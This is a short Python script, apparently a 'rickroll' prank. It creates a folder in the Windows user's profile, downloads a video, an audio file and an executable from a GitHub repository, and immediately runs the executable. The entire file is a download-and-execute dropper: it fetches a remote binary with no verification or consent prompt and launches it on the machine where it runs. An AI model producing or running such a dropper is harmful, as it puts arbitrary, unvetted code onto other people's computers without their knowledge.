import os
import requests


def create_directory(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)
def download_file(url, filename):
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)

user_name = os.getlogin()
save_directory = os.path.join("C:\\Users", user_name, "rickroll")
create_directory(save_directory)


video_filename = os.path.join(save_directory, "video.mp4")
if not os.path.exists(video_filename):
    video_url = "https://github.com/RedDySter20/Rickroll/raw/main/video.mp4"
    download_file(video_url, video_filename)

# Check if audio.mp3 exists, if not, download it
audio_filename = os.path.join(save_directory, "audio.mp3")
if not os.path.exists(audio_filename):
    audio_url = "https://github.com/RedDySter20/Rickroll/raw/main/audio.mp3"
    download_file(audio_url, audio_filename)

exe_filename = os.path.join(save_directory, "rickroll.exe")
if not os.path.exists(exe_filename):
    exe_url = "https://github.com/RedDySter20/Rickroll/releases/download/Rickroll/Lol.exe"
    download_file(exe_url, exe_filename)


import subprocess
exe_path = os.path.join(save_directory, "rickroll.exe")
subprocess.call([exe_path])